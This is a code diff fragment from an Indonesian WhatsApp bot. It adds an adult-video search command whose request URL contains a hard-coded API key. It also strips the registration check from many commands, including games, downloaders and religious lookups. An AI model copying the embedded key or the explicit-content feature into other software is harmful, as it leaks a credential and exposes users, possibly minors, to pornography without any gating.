+        let message = '🔽 Pilih kualitas video yang ingin diunduh:\n';
+        
+        if (videoUrls.low) {
+            message += `- *Low Quality*: ${videoUrls.low}\n`;
+        }
+        if (videoUrls.high) {
+            message += `- *High Quality*: ${videoUrls.high}\n`;
+        }
+        if (videoUrls.hls) {
+            message += `- *HLS Quality*: ${videoUrls.hls}\n`;
+        }
+
+        // Kirimkan pesan ke chat dengan semua kualitas yang tersedia
+        await sych.sendMessage(m.chat, { 
+            text: message
+        }, { quoted: fkontak });
+
+    } catch (err) {
+        console.error(err);
+        await sych.sendMessage(m.chat, {
+            text: `*Terjadi kesalahan!* 😭\n${err.message || err}`
+        }, { quoted: fkontak });
+    }
+    break;
+}
+//xnxx
+case 'xnxx': {
+     
+    if (!text) return sycreply(`Contoh: ${prefix + command} naruto`);
+    sycreply(mess.wait, { quoted: fkontak });
+
+    try {
+        const axios = require('axios');
+        const response = await axios.get(`https://api.zxcoderid.my.id/api/search/xnxx?q=${encodeURIComponent(text)}&apikey=lHW7OGsA67`);
+        const { status, code, data } = response.data;
+
+        if (status === 'Success' && code === 200 && data.status) {
+            const hasil = data.result.slice(0, 15); // Ambil maksimal 15 hasil
+
+            if (hasil.length === 0) return sycreply('Tidak ada hasil yang ditemukan!');
+
+            // Buat carousel cards dari hasil pencarian
+            const carouselCards = await Promise.all(hasil.map(async (xnxx, index) => ({
+                header: {
+                    title: `> ${xnxx.title || 'Tidak tersedia'}`,
+                    hasMediaAttachment: true,
+          imageMessage: (await generateWAMessageContent({
+            image: {
+              url: './src/media/sychy.png'
+            }
+          }, {
+            upload: sych.waUploadToServer
+          })).imageMessage
+        },
+                body: {
+                    text: `> 📄 *Info:* ${xnxx.info.trim() || 'Tidak tersedia'}\n> 🔗 *Link:* ${xnxx.link}`
+                },
+                footer: {
+                    text: `🔎 Hasil pencarian ke-${index + 1}`
+                },
+                nativeFlowMessage: {
+                    buttons: [
+                        {
+                            name: "cta_url",
+                            buttonParamsJson: JSON.stringify({
+                                display_text: "Tonton xnxx",
+                                url: xnxx.link
+                            })
+                        },
+                        {
+                            name: "cta_copy",
+                            buttonParamsJson: JSON.stringify({
+                                display_text: "Salin Link",
+                                copy_code: xnxx.link
+                            })
+                        }
+                    ]
+                }
+            })));
+
+            // Generate carousel message
+            const carouselMessage = generateWAMessageFromContent(m.chat, {
+                viewOnceMessage: {
+                    message: {
+                        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
+                            body: { text: `*Hasil pencarian untuk:* _${text}_` },
+                            footer: { text: "Powered by Langz" },
+                            header: { hasMediaAttachment: false },
+                            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
+                                cards: carouselCards
+                            })
+                        })
+                    }
+                }
+            }, { quoted: fkontak });
+
+            // Kirim pesan carousel
+            await sych.relayMessage(m.chat, carouselMessage.message, { messageId: carouselMessage.key.id });
+
+        } else {
+            sycreply('⚠️ Tidak ada hasil yang ditemukan. Pastikan kata kunci benar.');
+        }
+    } catch (error) {
+        console.error("Kesalahan saat mengirim carousel:", error);
+        await sych.sendMessage(m.chat, {
+            text: "Terjadi kesalahan saat mengambil data. Silakan coba lagi nanti."
+        }, { quoted: m });
+    }
+    break;
+}
+
+
 case 'song': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
 if (!text) return sycreply(`Example : ${prefix + command} anime whatsapp status`)
 await sycreply(mess.wait);
 let yts = require("youtube-yts")
@@ -6552,7 +15546,7 @@ for (const emoji of reactEmojis) {
 			}
 			break
 			case 'getq': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
     if (!m.quoted) return sycreply('Balas pesan yang ingin diambil datanya!');
     let quotedMessage = m.quoted;
     let messageContent = quotedMessage.msg || quotedMessage;
@@ -6607,7 +15601,7 @@ for (const emoji of reactEmojis) {
 			case 'ttvideo':
 			case 'tiktokmp4':
 			case 'tiktokvideo': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!text) {
 					console.log('Teks URL TikTok tidak ditemukan.');
 					return sycreply(`*< / >* Example: ${prefix + command} url_tiktok`);
@@ -6660,7 +15654,7 @@ for (const emoji of reactEmojis) {
 			case 'tiktokmp3':
 			case 'ttaudio':
 			case 'tiktokaudio': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!text) {
 					console.log('Teks URL TikTok tidak ditemukan.');
 					return sycreply(`*< / >* Example: ${prefix + command} url_tiktok`);
@@ -6730,7 +15724,7 @@ for (const emoji of reactEmojis) {
 			case 'fbdownload':
 			case 'fbmp4':
 			case 'fbvideo': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!text) return sycreply(`*< / >* Example: ${prefix + command} url_facebook`)
 				if (!text.includes('facebook.com')) return sycreply('Url Tidak Mengandung Result Dari Facebook!')
 				try {
@@ -6760,7 +15754,7 @@ for (const emoji of reactEmojis) {
 			}
 			break
 			case 'videymp4': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!isPremium) return sycreply(mess.prem);
 				if (!text) return sycreply(`*< / >* Example: ${prefix + command} url_videy`)
 				if (!text.includes('videy.co')) return sycreply('Url Tidak Mengandung Hasil Dari Videy!')
@@ -6799,7 +15793,7 @@ for (const emoji of reactEmojis) {
 			}
 			break;
 			case 'mediafire': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!text) {
 					console.log('URL tidak diberikan');
 					return sycreply(`*< / >* Example: ${prefix + command} https://www.mediafire.com/file/xxxxxxxxx/xxxxx.zip/file`);
@@ -6869,37 +15863,37 @@ for (const emoji of reactEmojis) {
 			break;
 			// Quotes Menu
 			case 'motivasi': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				const hasil = pickRandom(await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/kata-kata/motivasi.json'));
 				sycreply(hasil)
 			}
 			break
 			case 'bijak': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				const hasil = pickRandom(await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/kata-kata/bijak.json'));
 				sycreply(hasil)
 			}
 			break
 			case 'dare': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				const hasil = pickRandom(await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/kata-kata/dare.json'));
 				sycreply(hasil)
 			}
 			break
 			case 'quotes': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				const hasil = pickRandom(await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/kata-kata/quotes.json'));
 				sycreply(`_${hasil.quotes}_\n\n*- ${hasil.author}*`)
 			}
 			break
 			case 'truth': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				const hasil = pickRandom(await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/kata-kata/truth.json'));
 				sycreply(`_${hasil}_`)
 			}
 			break
 			case 'renungan': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				const hasil = pickRandom(await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/kata-kata/renungan.json'));
 				sycreply('', {
 					contextInfo: {
@@ -6918,7 +15912,7 @@ for (const emoji of reactEmojis) {
 			}
 			break
 			case 'bucin': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				const hasil = pickRandom(await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/kata-kata/bucin.json'));
 				sycreply(hasil)
 			}
@@ -6945,7 +15939,7 @@ for (const emoji of reactEmojis) {
 			}
 			break
 			case 'neko': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				try {
 					if (text == 'nsfw') {
 						const res = await fetchJson('https://api.waifu.pics/nsfw/neko')
@@ -6963,7 +15957,7 @@ for (const emoji of reactEmojis) {
 
 			// Fun Menu
 			case 'dadu': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				let ddsa = [{
 					url: 'https://telegra.ph/file/9f60e4cdbeb79fc6aff7a.png',
 					no: 1
@@ -7010,7 +16004,7 @@ for (const emoji of reactEmojis) {
 			case 'huluh':
 			case 'heleh':
 			case 'holoh': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!m.quoted && !text) return sycreply(`Kirim/reply text dengan caption ${prefix + command}`)
 				ter = command[1].toLowerCase()
 				tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
@@ -7018,7 +16012,7 @@ for (const emoji of reactEmojis) {
 			}
 			break
 			case 'bisakah': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!text) return sycreply(`*< / >* Example : ${prefix + command} saya menang?`)
 				let bisa = ['Bisa', 'Coba Saja', 'Pasti Bisa', 'Mungkin Saja', 'Tidak Bisa', 'Tidak Mungkin', 'Coba Ulangi', 'Ngimpi kah?', 'yakin bisa?']
 				let keh = bisa[Math.floor(Math.random() * bisa.length)]
@@ -7026,7 +16020,7 @@ for (const emoji of reactEmojis) {
 			}
 			break
 			case 'apakah': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!text) return sycreply(`*< / >* Example : ${prefix + command} saya bisa menang?`)
 				let apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Coba Ulangi', 'Mungkin Saja', 'Mungkin Tidak', 'Mungkin Iya', 'Ntahlah']
 				let kah = apa[Math.floor(Math.random() * apa.length)]
@@ -7035,7 +16029,7 @@ for (const emoji of reactEmojis) {
 			break
 			case 'kapan':
 			case 'kapankah': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!text) return sycreply(`*< / >* Example : ${prefix + command} saya menang?`)
 				let kapan = ['Besok', 'Lusa', 'Nanti', '4 Hari Lagi', '5 Hari Lagi', '6 Hari Lagi', '1 Minggu Lagi', '2 Minggu Lagi', '3 Minggu Lagi', '1 Bulan Lagi', '2 Bulan Lagi', '3 Bulan Lagi', '4 Bulan Lagi', '5 Bulan Lagi', '6 Bulan Lagi', '1 Tahun Lagi', '2 Tahun Lagi', '3 Tahun Lagi', '4 Tahun Lagi', '5 Tahun Lagi', '6 Tahun Lagi', '1 Abad lagi', '3 Hari Lagi', 'Bulan Depan', 'Ntahlah', 'Tidak Akan Pernah']
 				let koh = kapan[Math.floor(Math.random() * kapan.length)]
@@ -7045,7 +16039,7 @@ for (const emoji of reactEmojis) {
 			case 'tanyakerang':
 			case 'kerangajaib':
 			case 'kerang': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!text) return sycreply(`*< / >* Example : ${prefix + command} boleh pinjam 100?`)
 				let krng = ['Mungkin suatu hari', 'Tidak juga', 'Tidak keduanya', 'Kurasa tidak', 'Ya', 'Tidak', 'Coba tanya lagi', 'Tidak ada']
 				let jwb = pickRandom(krng)
@@ -7053,7 +16047,7 @@ for (const emoji of reactEmojis) {
 			}
 			break
 			case 'cekmati': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!text) return sycreply(`*< / >* Example : ${prefix + command} nama lu`)
 				let teksnya = text.replace(/[\uD800-\uDBFF][\uDC00-\uDFFF]/g, '').replace(/\d/g, '');
 				let {
@@ -7063,7 +16057,7 @@ for (const emoji of reactEmojis) {
 			}
 			break
 			case 'ceksifat': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				let sifat_a = ['Bijak', 'Sabar', 'Kreatif', 'Humoris', 'Mudah bergaul', 'Mandiri', 'Setia', 'Jujur', 'Dermawan', 'Idealis', 'Adil', 'Sopan', 'Tekun', 'Rajin', 'Pemaaf', 'Murah hati', 'Ceria', 'Percaya diri', 'Penyayang', 'Disiplin', 'Optimis', 'Berani', 'Bersyukur', 'Bertanggung jawab', 'Bisa diandalkan', 'Tenang', 'Kalem', 'Logis']
 				let sifat_b = ['Sombong', 'Minder', 'Pendendam', 'Sensitif', 'Perfeksionis', 'Caper', 'Pelit', 'Egois', 'Pesimis', 'Penyendiri', 'Manipulatif', 'Labil', 'Penakut', 'Vulgar', 'Tidak setia', 'Pemalas', 'Kasar', 'Rumit', 'Boros', 'Keras kepala', 'Tidak bijak', 'Pembelot', 'Serakah', 'Tamak', 'Penggosip', 'Rasis', 'Ceroboh', 'Intoleran']
 				let teks = `╭──❍「 *Cek Sifat* 」❍\n│• Sifat ${text && m.mentionedJid ? text : '@' + m.sender.split('@')[0]}${(text && m.mentionedJid ? '' : (`\n│• Nama : *${text ? text : m.pushName}*` || '\n│• Nama : *Tanpa Nama*'))}\n│• Orang yang : *${pickRandom(sifat_a)}*\n│• Kekurangan : *${pickRandom(sifat_b)}*\n│• Keberanian : *${Math.floor(Math.random() * 100)}%*\n│• Kepedulian : *${Math.floor(Math.random() * 100)}%*\n│• Kecemasan : *${Math.floor(Math.random() * 100)}%*\n│• Ketakutan : *${Math.floor(Math.random() * 100)}%*\n│• Akhlak Baik : *${Math.floor(Math.random() * 100)}%*\n│• Akhlak Buruk : *${Math.floor(Math.random() * 100)}%*\n╰──────❍`
@@ -7071,7 +16065,7 @@ for (const emoji of reactEmojis) {
 			}
 			break
 			case 'cekkhodam': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!text) return sycreply(`*< / >* Example : ${prefix + command} nama lu`);
 				try {
 					const hasil = pickRandom(await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/random/cekkhodam.json'));
@@ -7088,7 +16082,7 @@ for (const emoji of reactEmojis) {
 			}
 			break;
 			case 'jodohku': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!m.isGroup) return sycreply(mess.group)
 				let member = (store.groupMetadata[m.chat] ? store.groupMetadata[m.chat].participants : m.metadata.participants).map(a => a.id)
 				let jodoh = pickRandom(member)
@@ -7129,29 +16123,29 @@ for (const emoji of reactEmojis) {
 			break
 			// Game Menu
 			case 'slot': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				await gameSlot(sych, m, db)
 			}
 			break
 			case 'casino': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				await gameCasinoSolo(sych, m, prefix, db)
 			}
 			break
 			case 'rampok':
 			case 'merampok': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				await gameMerampok(m, db)
 			}
 			break
 			case 'begal': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				await gameBegal(sych, m, db)
 			}
 			break
 			case 'suitpvp':
 			case 'suit': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				let poin = 10
 				let poin_lose = 10
 				let timeout = 60000
@@ -7181,7 +16175,7 @@ for (const emoji of reactEmojis) {
 			break
 			//[ *CASE AI JOKO SIJAWA* ]
 			case "joko": {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!text) return sycreply("mau nanya apa sama joko\nExampel: .joko nama kamu siapa?")
 				await sych.sendMessage(m.chat, {
 					mimetype: 'audio/mp4',
@@ -7196,7 +16190,7 @@ for (const emoji of reactEmojis) {
 			case 'ttc':
 			case 'ttt':
 			case 'tictactoe': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				let TicTacToe = require('./lib/tictactoe');
 				if (Object.values(tictactoe).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return sycreply(`Kamu masih didalam game!\nKetik *${prefix}del${command}* Jika Ingin Mengakhiri sesi`);
 				let room = Object.values(tictactoe).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
@@ -7257,7 +16251,7 @@ for (const emoji of reactEmojis) {
 			}
 			break
 			case 'akinator': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (text == 'start') {
 					if (akinator[m.sender]) return sycreply('Masih Ada Sesi Yang Belum Diselesaikan!')
 					akinator[m.sender] = new Akinator({
@@ -7287,7 +16281,7 @@ for (const emoji of reactEmojis) {
 			}
 			break
 			case 'tebakbom': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (tebakbom[m.sender]) return sycreply('Masih Ada Sesi Yang Belum Diselesaikan!')
 				tebakbom[m.sender] = {
 					petak: [0, 0, 0, 2, 0, 2, 0, 2, 0, 0].sort(() => Math.random() - 0.5),
@@ -7311,7 +16305,7 @@ for (const emoji of reactEmojis) {
 			}
 			break
 			case 'tekateki': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (iGame(tekateki, m.chat)) return sycreply('Masih Ada Sesi Yang Belum Diselesaikan!')
 				const hasil = pickRandom(await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/games/tekateki.json'));
 				let {
@@ -7335,7 +16329,7 @@ for (const emoji of reactEmojis) {
 			}
 			break
 			case 'tebaklirik': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (iGame(tebaklirik, m.chat)) return sycreply('Masih Ada Sesi Yang Belum Diselesaikan!')
 				const hasil = pickRandom(await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/games/tebaklirik.json'));
 				let {
@@ -7359,7 +16353,7 @@ for (const emoji of reactEmojis) {
 			}
 			break
 			case 'listsurah': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				try {
 					const surahList = ["1. Al-Fatihah", "2. Al-Baqarah", "3. Ali Imran", "4. An-Nisa", "5. Al-Ma'idah", "6. Al-An'am", "7. Al-A'raf", "8. Al-Anfal", "9. At-Tawbah", "10. Yunus", "11. Hud", "12. Yusuf", "13. Ar-Ra'd", "14. Ibrahim", "15. Al-Hijr", "16. An-Nahl", "17. Al-Isra", "18. Al-Kahf", "19. Maryam", "20. Ta-Ha", "21. Al-Anbiya", "22. Al-Hajj", "23. Al-Mu'minun", "24. An-Nur", "25. Al-Furqan", "26. Ash-Shu'ara", "27. An-Naml", "28. Al-Qasas", "29. Al-Ankabut", "30. Ar-Rum", "31. Luqman", "32. As-Sajdah", "33. Al-Ahzab", "34. Saba'", "35. Fatir", "36. Ya-Sin", "37. As-Saffat", "38. Sad", "39. Az-Zumar", "40. Ghafir", "41. Fussilat", "42. Ash-Shura", "43. Az-Zukhruf", "44. Ad-Dukhan", "45. Al-Jathiyah", "46. Al-Ahqaf", "47. Muhammad", "48. Al-Fath", "49. Al-Hujurat", "50. Qaf", "51. Az-Zariyat", "52. At-Tur", "53. An-Najm", "54. Al-Qamar", "55. Ar-Rahman", "56. Al-Waqi'ah", "57. Al-Hadid", "58. Al-Mujadilah", "59. Al-Hashr", "60. Al-Mumtahanah", "61. As-Saff", "62. Al-Jumu'ah", "63. Al-Munafiqun", "64. At-Taghabun", "65. At-Talaq", "66. At-Tahrim", "67. Al-Mulk", "68. Al-Qalam", "69. Al-Haqqah", "70. Al-Ma'arij", "71. Nuh", "72. Al-Jinn", "73. Al-Muzzammil", "74. Al-Muddathir", "75. Al-Qiyamah", "76. Al-Insan", "77. Al-Mursalat", "78. An-Naba'", "79. An-Nazi'at", "80. Abasa", "81. At-Takwir", "82. Al-Infitar", "83. Al-Mutaffifin", "84. Al-Inshiqaq", "85. Al-Buruj", "86. At-Tariq", "87. Al-A'la", "88. Al-Ghashiyah", "89. Al-Fajr", "90. Al-Balad", "91. Ash-Shams", "92. Al-Lail", "93. Ad-Duhaa", "94. Al-Inshirah", "95. At-Tin", "96. Al-'Alaq", "97. Al-Qadr", "98. Al-Bayyinah", "99. Az-Zalzalah", "100. Al-Adiyat", "101. Al-Qari'ah", "102. At-Takathur", "103. Al-Asr", "104. Al-Humazah", "105. Al-Fil", "106. Quraysh", "107. Al-Ma'un", "108. Al-Kawthar", "109. Al-Kafirun", "110. An-Nasr", "111. Al-Masad", "112. Al-Ikhlas", "113. Al-Falaq", "114. An-Nas"];
 					const surahMessage = `*Daftar Surah Al-Qur'an:*\n\n${surahList.join('\n')}`;
@@ -7377,7 +16371,7 @@ for (const emoji of reactEmojis) {
 			}
 			break;
 			case 'bacaansholat': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				const bacaanshalat = {
 					"result": [{
 						"id": 1,
@@ -7437,7 +16431,7 @@ for (const emoji of reactEmojis) {
 			}
 			break
 			case 'listdoa': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				try {
 					// Ambil data dari API
 					const response = await fetch('https://doa-doa-api-ahmadramadhan.fly.dev/api');
@@ -7460,7 +16454,7 @@ for (const emoji of reactEmojis) {
 				break;
 			}
 			case 'doa': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				try {
 					// Ambil ID doa dari argumen
 					const id = args[0];
@@ -7515,7 +16509,7 @@ for (const emoji of reactEmojis) {
 				break;
 			}
 			case 'quran': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!text) return sycreply(`*${prefix + command}* Masukkan nomor surah!`);
 				const surahNumber = parseInt(text);
 				if (isNaN(surahNumber) || surahNumber < 1 || surahNumber > 114) {
@@ -7577,7 +16571,7 @@ for (const emoji of reactEmojis) {
 			}
 			break;
 			case 'tebakkata': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (iGame(tebakkata, m.chat)) return sycreply('Masih Ada Sesi Yang Belum Diselesaikan!')
 				const hasil = pickRandom(await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/games/tebakkata.json'));
 				let {
@@ -7595,7 +16589,7 @@ for (const emoji of reactEmojis) {
 			}
 			break
 			case 'family100': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (family100.hasOwnProperty(m.chat)) return sycreply('Masih Ada Sesi Yang Belum Diselesaikan!')
 				const hasil = pickRandom(await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/games/family100.json'));
 				let {
@@ -7621,7 +16615,7 @@ for (const emoji of reactEmojis) {
 			}
 			break
 			case 'susunkata': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (iGame(susunkata, m.chat)) return sycreply('Masih Ada Sesi Yang Belum Diselesaikan!')
 				const hasil = pickRandom(await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/games/susunkata.json'));
 				let {
@@ -7645,7 +16639,7 @@ for (const emoji of reactEmojis) {
 			}
 			break
 			case 'tebakkimia': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (iGame(tebakkimia, m.chat)) return sycreply('Masih Ada Sesi Yang Belum Diselesaikan!')
 				const hasil = pickRandom(await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/games/tebakkimia.json'));
 				let {
@@ -7663,7 +16657,7 @@ for (const emoji of reactEmojis) {
 			}
 			break
 			case 'caklontong': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (iGame(caklontong, m.chat)) return sycreply('Masih Ada Sesi Yang Belum Diselesaikan!')
 				const hasil = pickRandom(await fetchJson('https://raw.githubusercontent.com/nazedev/database/refs/heads/master/games/caklontong.json'));
 				let {
@@ -7688,7 +16682,7 @@ for (const emoji of reactEmojis) {
 			}
 			break
 			case 'aitukam': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!text && (!m.quoted || !m.quoted.text)) return sycreply(`Kirim/reply pesan *${prefix + command}* Teksnya`);
 				try {
 					// Mengambil teks dari pesan atau pesan yang diteruskan
@@ -7708,7 +16702,7 @@ for (const emoji of reactEmojis) {
 			}
 			break;
 			case 'meta': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (!text && (!m.quoted || !m.quoted.text)) return sycreply(`Kirim/reply pesan *${prefix + command}* Teksnya`);
 				try {
 					// Mengambil teks dari pesan atau pesan yang diteruskan
@@ -7728,7 +16722,7 @@ for (const emoji of reactEmojis) {
 			}
 			break;
 			case 'luminai': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
     // Cek apakah ada teks yang dikirim atau teks dari pesan yang dikutip
     if (!text && (!m.quoted || !m.quoted.text)) return sycreply(`Kirim/reply pesan *${prefix + command}* Teksnya`);
 
@@ -7752,7 +16746,7 @@ for (const emoji of reactEmojis) {
 }
 break;
 case 'esia': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     // Cek apakah ada teks yang dikirim atau teks dari pesan yang dikutip
     if (!text && (!m.quoted || !m.quoted.text)) return sycreply(`Kirim/reply pesan *${prefix + command}* Teksnya`);
 
@@ -7776,7 +16770,7 @@ case 'esia': {
 }
 break;
 case 'gemini': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     // Cek apakah ada teks yang dikirim atau teks dari pesan yang dikutip
     if (!text && (!m.quoted || !m.quoted.text)) return sycreply(`Kirim/reply pesan *${prefix + command}* Teksnya`);
 
@@ -7800,7 +16794,7 @@ case 'gemini': {
 }
 break;
 case 'llama': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     // Cek apakah ada teks yang dikirim atau teks dari pesan yang dikutip
     if (!text && (!m.quoted || !m.quoted.text)) return sycreply(`Kirim/reply pesan *${prefix + command}* Teksnya`);
 
@@ -7826,7 +16820,7 @@ break;
 
 // Fungsi untuk mengatur autoai2
 case 'autoai2': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     // Mengecek apakah ada parameter on/off
     if (!isCreator) return sycreply(mess.owner); // Memeriksa apakah pengirim adalah pembuat bot
     if (!text) return sycreply(`Gunakan perintah *${prefix + command}* on/off`);
@@ -7850,7 +16844,7 @@ case 'autoai2': {
 }
 break;
 case 'setpromt': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
         if (!text) return sycreply("Harap masukkan prompt baru!");
         userPrompt = text; // Simpan prompt baru dari input pengguna
         sycreply(`Prompt berhasil diatur menjadi: "${userPrompt}"`);
@@ -7858,7 +16852,7 @@ case 'setpromt': {
     }
     
 case 'setpromt2': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     // Cek apakah pengguna mengirim prompt baru
     if (!text) return sycreply(`Kirim perintah *${prefix + command}* <prompt baru>`);
 
@@ -7868,7 +16862,7 @@ case 'setpromt2': {
 }
 break;
 			case 'tebaknegara': {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 				if (iGame(tebaknegara, m.chat)) return sycreply('Masih Ada Sesi Yang Belum Diselesaikan!')
